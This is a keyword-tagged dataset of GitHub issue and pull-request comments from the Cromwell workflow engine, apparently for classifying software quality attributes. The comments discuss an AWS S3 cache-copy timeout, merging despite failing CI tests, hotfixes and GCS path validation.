https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1572,Safety,timeout,timeout,1572,"**@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:2003,Safety,Timeout,TimeoutException,2003,"ay be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:68,Testability,test,testing,68,"> This is unusual, I have successfully call cached files of 1 TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1855,Testability,log,log,1855,"ell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:3196,Testability,log,log,3196,"Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thing is, even within the exact same attempt, stdout.log, stderr.log, and many side product files were successfully cached and copied to new places on S3, while only bam file failed. The only difference between bam file and other files is file size. I think this observation can exclude a lot of potential reasons.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:3208,Testability,log,log,3208,"Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thing is, even within the exact same attempt, stdout.log, stderr.log, and many side product files were successfully cached and copied to new places on S3, while only bam file failed. The only difference between bam file and other files is file size. I think this observation can exclude a lot of potential reasons.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046
https://github.com/broadinstitute/cromwell/pull/5981#issuecomment-718148525:94,Testability,log,logging,94,Merging to a non-develop branch despite problems in Travis because we are deliberately adding logging (which Travis cannot handle) in order to debug a production incident.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5981#issuecomment-718148525
https://github.com/broadinstitute/cromwell/pull/5982#issuecomment-718140957:78,Performance,queue,queue,78,Merging with caveats:; - sbt tests are passing; - aws centaur is using an old queue; - other centaurs are failing due to expected and excessive logging. None of this is expected to negatively affect production,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5982#issuecomment-718140957
https://github.com/broadinstitute/cromwell/pull/5982#issuecomment-718140957:29,Testability,test,tests,29,Merging with caveats:; - sbt tests are passing; - aws centaur is using an old queue; - other centaurs are failing due to expected and excessive logging. None of this is expected to negatively affect production,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5982#issuecomment-718140957
https://github.com/broadinstitute/cromwell/pull/5982#issuecomment-718140957:144,Testability,log,logging,144,Merging with caveats:; - sbt tests are passing; - aws centaur is using an old queue; - other centaurs are failing due to expected and excessive logging. None of this is expected to negatively affect production,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5982#issuecomment-718140957
https://github.com/broadinstitute/cromwell/pull/5983#issuecomment-718139547:94,Testability,log,logging,94,Merging to a non-develop branch despite problems in Travis because we are deliberately adding logging (which Travis cannot handle) in order to debug a production incident.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5983#issuecomment-718139547
https://github.com/broadinstitute/cromwell/pull/5984#issuecomment-718183473:19,Testability,test,test,19,"Merging, since SBT test passed. Other PR tests may fail due to excessive logging, but we are making an exception in this case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5984#issuecomment-718183473
https://github.com/broadinstitute/cromwell/pull/5984#issuecomment-718183473:41,Testability,test,tests,41,"Merging, since SBT test passed. Other PR tests may fail due to excessive logging, but we are making an exception in this case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5984#issuecomment-718183473
https://github.com/broadinstitute/cromwell/pull/5984#issuecomment-718183473:73,Testability,log,logging,73,"Merging, since SBT test passed. Other PR tests may fail due to excessive logging, but we are making an exception in this case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5984#issuecomment-718183473
https://github.com/broadinstitute/cromwell/pull/5988#issuecomment-718235174:56,Testability,test,tests,56,See comments in #5982 regarding merging with only `sbt` tests passing.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5988#issuecomment-718235174
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718243500:31,Availability,failure,failure,31,"Also as a TOL, maybe consider `failure.toPrettyElidedString` in case the exception content is extremely long?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718243500
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246076:86,Integrability,message,messages,86,"TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246076
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246076:33,Security,hash,hash,33,"TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246076
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900:200,Availability,failure,failure,200,"> TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?. But there is hash in there:; `logger.info(s""Failed to execute GCS Batch request $batchCommandsHash"", failure)`. Or do you mean something else?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900:88,Integrability,message,messages,88,"> TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?. But there is hash in there:; `logger.info(s""Failed to execute GCS Batch request $batchCommandsHash"", failure)`. Or do you mean something else?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900:35,Security,hash,hash,35,"> TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?. But there is hash in there:; `logger.info(s""Failed to execute GCS Batch request $batchCommandsHash"", failure)`. Or do you mean something else?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900:112,Security,hash,hash,112,"> TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?. But there is hash in there:; `logger.info(s""Failed to execute GCS Batch request $batchCommandsHash"", failure)`. Or do you mean something else?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900:129,Testability,log,logger,129,"> TOL2: is it worth another ad-hoc hash/UUID here to connect the ""sending"" and ""result"" messages?. But there is hash in there:; `logger.info(s""Failed to execute GCS Batch request $batchCommandsHash"", failure)`. Or do you mean something else?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718246900
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718293016:4,Testability,test,tests,4,SBT tests passed - merging. Centaur tests failed because of excessive logging and this is expected.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718293016
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718293016:36,Testability,test,tests,36,SBT tests passed - merging. Centaur tests failed because of excessive logging and this is expected.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718293016
https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718293016:70,Testability,log,logging,70,SBT tests passed - merging. Centaur tests failed because of excessive logging and this is expected.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5989#issuecomment-718293016
https://github.com/broadinstitute/cromwell/pull/5993#issuecomment-719024604:72,Availability,redundant,redundant,72,Requesting re-review because this now includes a less-likely-to-be-made-redundant unit test,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5993#issuecomment-719024604
https://github.com/broadinstitute/cromwell/pull/5993#issuecomment-719024604:72,Safety,redund,redundant,72,Requesting re-review because this now includes a less-likely-to-be-made-redundant unit test,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5993#issuecomment-719024604
https://github.com/broadinstitute/cromwell/pull/5993#issuecomment-719024604:87,Testability,test,test,87,Requesting re-review because this now includes a less-likely-to-be-made-redundant unit test,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5993#issuecomment-719024604
https://github.com/broadinstitute/cromwell/pull/5994#issuecomment-719027140:40,Deployability,hotfix,hotfix,40,@grsterin LGTM. Reminder to also make a hotfix edition of this change,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5994#issuecomment-719027140
https://github.com/broadinstitute/cromwell/pull/5996#issuecomment-729791692:5,Availability,redundant,redundant,5,"Made redundant by a recent change to the test expectations. Closing this ""now just whitespace"" PR",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5996#issuecomment-729791692
https://github.com/broadinstitute/cromwell/pull/5996#issuecomment-729791692:5,Safety,redund,redundant,5,"Made redundant by a recent change to the test expectations. Closing this ""now just whitespace"" PR",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5996#issuecomment-729791692
https://github.com/broadinstitute/cromwell/pull/5996#issuecomment-729791692:41,Testability,test,test,41,"Made redundant by a recent change to the test expectations. Closing this ""now just whitespace"" PR",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5996#issuecomment-729791692
https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141:46,Availability,failure,failures,46,"Merging for expediency despite two flaky test failures because (1) the 53_hotfix branch will be retested and added to before being deployed, and (2) the hotfix is not being used in situations relevant to the test failures. The tests which failed were:; * CWL conformance on PAPIv2 beta; * PAPIv2 beta on MariaDB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141
https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141:213,Availability,failure,failures,213,"Merging for expediency despite two flaky test failures because (1) the 53_hotfix branch will be retested and added to before being deployed, and (2) the hotfix is not being used in situations relevant to the test failures. The tests which failed were:; * CWL conformance on PAPIv2 beta; * PAPIv2 beta on MariaDB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141
https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141:131,Deployability,deploy,deployed,131,"Merging for expediency despite two flaky test failures because (1) the 53_hotfix branch will be retested and added to before being deployed, and (2) the hotfix is not being used in situations relevant to the test failures. The tests which failed were:; * CWL conformance on PAPIv2 beta; * PAPIv2 beta on MariaDB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141
https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141:153,Deployability,hotfix,hotfix,153,"Merging for expediency despite two flaky test failures because (1) the 53_hotfix branch will be retested and added to before being deployed, and (2) the hotfix is not being used in situations relevant to the test failures. The tests which failed were:; * CWL conformance on PAPIv2 beta; * PAPIv2 beta on MariaDB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141
https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141:41,Testability,test,test,41,"Merging for expediency despite two flaky test failures because (1) the 53_hotfix branch will be retested and added to before being deployed, and (2) the hotfix is not being used in situations relevant to the test failures. The tests which failed were:; * CWL conformance on PAPIv2 beta; * PAPIv2 beta on MariaDB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141
https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141:208,Testability,test,test,208,"Merging for expediency despite two flaky test failures because (1) the 53_hotfix branch will be retested and added to before being deployed, and (2) the hotfix is not being used in situations relevant to the test failures. The tests which failed were:; * CWL conformance on PAPIv2 beta; * PAPIv2 beta on MariaDB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141
https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141:227,Testability,test,tests,227,"Merging for expediency despite two flaky test failures because (1) the 53_hotfix branch will be retested and added to before being deployed, and (2) the hotfix is not being used in situations relevant to the test failures. The tests which failed were:; * CWL conformance on PAPIv2 beta; * PAPIv2 beta on MariaDB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5997#issuecomment-719658141
https://github.com/broadinstitute/cromwell/issues/6001#issuecomment-1079171605:21,Security,Hash,Hashicorp,21,I am currently using Hashicorp Nomad for some other applications. I am interested in using Nomad to run Cromwell jobs.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6001#issuecomment-1079171605
https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719587716:22,Testability,test,tests,22,"Well aware this needs tests, wanted to throw it out for early, early review",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719587716
https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719607732:282,Availability,error,error,282,"> TOL: should CWL or WDL 2.0 Directory type values support buckets-as-""directory""s?. Good point, and I have no idea. Do we have any known or existing test cases (I'll see in a bit when the conformance tests run). I'm happy to:; - Allow bucket only `GcsPath`, instead only catch the error just before GCS API requests, _or_; - Leave it for now and relax it later as we get tests cases, with a comment pointing to this conversation",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719607732
https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719607732:150,Testability,test,test,150,"> TOL: should CWL or WDL 2.0 Directory type values support buckets-as-""directory""s?. Good point, and I have no idea. Do we have any known or existing test cases (I'll see in a bit when the conformance tests run). I'm happy to:; - Allow bucket only `GcsPath`, instead only catch the error just before GCS API requests, _or_; - Leave it for now and relax it later as we get tests cases, with a comment pointing to this conversation",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719607732
https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719607732:201,Testability,test,tests,201,"> TOL: should CWL or WDL 2.0 Directory type values support buckets-as-""directory""s?. Good point, and I have no idea. Do we have any known or existing test cases (I'll see in a bit when the conformance tests run). I'm happy to:; - Allow bucket only `GcsPath`, instead only catch the error just before GCS API requests, _or_; - Leave it for now and relax it later as we get tests cases, with a comment pointing to this conversation",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719607732
https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719607732:372,Testability,test,tests,372,"> TOL: should CWL or WDL 2.0 Directory type values support buckets-as-""directory""s?. Good point, and I have no idea. Do we have any known or existing test cases (I'll see in a bit when the conformance tests run). I'm happy to:; - Allow bucket only `GcsPath`, instead only catch the error just before GCS API requests, _or_; - Leave it for now and relax it later as we get tests cases, with a comment pointing to this conversation",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719607732
https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719639906:376,Security,validat,validation,376,"FYI- @cjllanwarne / @mcovarr: After working with the `GcsPath` tests I'm backing away from trying to figure out if a `GcsPath` is ""valid"" if it's a bucket only. Path-theory is just too complex to think about right now. Happy to give examples IRL, but mindbenders include:. - `""gs://bucket/""`; - `""gs://bucket""`; - `""gs://bucket/.""`; - `""gs://bucket/ ""`; - etc. I'll leave the validation in `GcsBatchIoCommand` though, ensuring we never issue requests to `list` instead of `get` objects.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719639906
